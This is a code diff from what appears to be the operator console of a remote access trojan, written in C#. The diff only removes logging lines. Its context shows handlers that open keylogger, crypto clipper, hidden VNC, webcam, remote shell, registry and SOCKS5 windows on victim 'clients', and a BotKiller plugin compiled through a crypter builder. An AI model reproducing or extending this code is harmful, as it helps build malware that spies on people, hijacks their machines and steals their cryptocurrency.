@@ -334,7 +334,6 @@ public partial class ServerWindow : Window
         ClipperLog.AppendText(line);
         ClipperLogScroll.ScrollToEnd();
         ClipperCountTxt.Text = $"  —  {_clipperCount} replacement{(_clipperCount != 1 ? "s" : "")}";
-        Log($"[CLIPPER] {data.Type} replaced on {display}");
     }
 
     // ── Server-side Telegram notification (global counter) ──────────────────────
@@ -909,7 +908,6 @@ public partial class ServerWindow : Window
         foreach (var k in keys) _featureWindows[k] = win;
         win.Closed += (_, _) => { foreach (var k in keys) _featureWindows.Remove(k); };
         win.Show();
-        Log($"[*] Remote shell opened for {newClients.Count} client(s).");
     }
 
     private async void RemoteDesktop_Click(object sender, RoutedEventArgs e)
@@ -934,7 +932,6 @@ public partial class ServerWindow : Window
             i++;
             if (clients.Count > 1) await Task.Delay(80);
         }
-        Log($"[*] Remote desktop opened for {clients.Count} client(s).");
     }
 
     private async void RemoteWebcam_Click(object sender, RoutedEventArgs e)
@@ -961,7 +958,6 @@ public partial class ServerWindow : Window
             i++;
             if (clients.Count > 1) await Task.Delay(80);
         }
-        Log($"[*] Remote webcam opened for {clients.Count} client(s).");
     }
 
     private async void TcpManager_Click(object sender, RoutedEventArgs e)
@@ -1028,7 +1024,6 @@ public partial class ServerWindow : Window
             OpenFeatureWindow<ProcessManagerWindow>(c.Id, () => new ProcessManagerWindow(_server, c.Id, c.Id));
             if (clients.Count > 1) await Task.Delay(80);
         }
-        Log($"[*] Process Manager opened for {clients.Count} client(s).");
     }
 
     private async void Socks5_Click(object sender, RoutedEventArgs e)
@@ -1053,7 +1048,6 @@ public partial class ServerWindow : Window
             OpenFeatureWindow<ServiceManagerWindow>(c.Id, () => new ServiceManagerWindow(_server, c.Id, c.Id));
             if (clients.Count > 1) await Task.Delay(80);
         }
-        Log($"[*] Service Manager opened for {clients.Count} client(s).");
     }
 
     private async void WindowManager_Click(object sender, RoutedEventArgs e)
@@ -1065,7 +1059,6 @@ public partial class ServerWindow : Window
             OpenFeatureWindow<WindowManagerWindow>(c.Id, () => new WindowManagerWindow(_server, c.Id, c.Id));
             if (clients.Count > 1) await Task.Delay(80);
         }
-        Log($"[*] Window Manager opened for {clients.Count} client(s).");
     }
 
     private async void RegistryEditor_Click(object sender, RoutedEventArgs e)
@@ -1084,7 +1077,6 @@ public partial class ServerWindow : Window
             OpenFeatureWindow<RegistryEditorWindow>(c.Id, () => new RegistryEditorWindow(_server, c.Id, c.Id));
             if (clients.Count > 1) await Task.Delay(80);
         }
-        Log($"[*] Registry Editor opened for {clients.Count} client(s).");
     }
 
     private async void InstalledApps_Click(object sender, RoutedEventArgs e)
@@ -1096,7 +1088,6 @@ public partial class ServerWindow : Window
             OpenFeatureWindow<InstalledAppsWindow>(c.Id, () => new InstalledAppsWindow(_server, c.Id, c.Id));
             if (clients.Count > 1) await Task.Delay(80);
         }
-        Log($"[*] Installed Apps opened for {clients.Count} client(s).");
     }
 
     private async void DeviceManager_Click(object sender, RoutedEventArgs e)
@@ -1108,7 +1099,6 @@ public partial class ServerWindow : Window
             OpenFeatureWindow<DeviceManagerWindow>(c.Id, () => new DeviceManagerWindow(_server, c.Id, c.Id));
             if (clients.Count > 1) await Task.Delay(80);
         }
-        Log($"[*] Device Manager opened for {clients.Count} client(s).");
     }
 
     private async void PerformanceMonitor_Click(object sender, RoutedEventArgs e)
@@ -1120,7 +1110,6 @@ public partial class ServerWindow : Window
             OpenFeatureWindow<PerformanceMonitorWindow>(c.Id, () => new PerformanceMonitorWindow(_server, c.Id, c.Id));
             if (clients.Count > 1) await Task.Delay(80);
         }
-        Log($"[*] Performance Monitor opened for {clients.Count} client(s).");
     }
 
     // ── Miscellaneous quick-send to selected clients ────────────────────────
@@ -1242,7 +1231,6 @@ public partial class ServerWindow : Window
             OpenFeatureWindow<KeyloggerWindow>(c.Id, () => new KeyloggerWindow(_server, c.Id, c.Id));
             if (clients.Count > 1) await Task.Delay(80);
         }
-        Log($"[*] Keylogger opened for {clients.Count} client(s).");
     }
 
     private async void CryptoClipper_Click(object sender, RoutedEventArgs e)
@@ -1254,7 +1242,6 @@ public partial class ServerWindow : Window
             OpenFeatureWindow<CryptoClipperWindow>(c.Id, () => new CryptoClipperWindow(_server, c.Id, c.Id));
             if (clients.Count > 1) await Task.Delay(80);
         }
-        Log($"[*] Crypto Clipper opened for {clients.Count} client(s).");
     }
 
     private HvncBroadcastWindow? _broadcastWindow;
@@ -1292,7 +1279,6 @@ public partial class ServerWindow : Window
             i++;
             if (clients.Count > 1) await Task.Delay(80);
         }
-        Log($"[*] HVNC opened for {clients.Count} client(s).");
     }
 
 
@@ -3473,7 +3459,6 @@ Read-Host 'Press Enter to close'
         var dashUrl = $"http://{localIp}:8080/";
         try { System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo(dashUrl) { UseShellExecute = true }); }
         catch { }
-        Log($"[*] Stats-server → {BldMnrStatsUrl.Text}");
     }
 
     // ── BotKiller: send to selected clients on-demand (right-click menu) ──
@@ -3482,7 +3467,6 @@ Read-Host 'Press Enter to close'
         var clients = GetSelectedClients();
         if (clients.Count == 0 || _server == null) return;
 
-        Log("[*] BotKiller: compiling...");
         var bytes = await Builder.CrypterBuilder.CompilePluginDllAsync(
             Builder.PluginSources.BotKiller, "advapi32.lib", Log);
         if (bytes == null) { Log("[!] BotKiller: compile failed."); return; }
